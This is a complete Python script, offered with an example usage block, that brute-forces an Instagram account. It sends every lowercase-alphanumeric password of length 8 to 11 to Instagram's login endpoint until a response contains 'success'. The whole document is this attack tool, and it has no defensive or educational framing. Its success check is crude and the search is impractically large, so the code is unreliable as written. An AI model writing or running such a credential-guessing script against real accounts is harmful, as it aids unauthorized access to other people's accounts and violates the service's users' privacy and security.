import requests
from itertools import product
import string

def bruteforce_instagram(username, url):
    # Characters to use for passwords
    chars = string.ascii_lowercase + string.digits
    # Length of passwords to try
    for length in range(8, 12):
        for password in product(chars, repeat=length):
            password = ''.join(password)
            response = requests.post(url, data={'username': username, 'password': password})
            # Check if the login was successful
            if "success" in response.text.lower():
                return password
            print(f"Trying password: {password}")
    return None

# Example usage:
username = 'your_instagram_username'
url = 'https://instagram.com/accounts/login/ajax/'
password = bruteforce_instagram(username, url)
if password:
    print(f"Password found: {password}")
else:
    print("No password found.")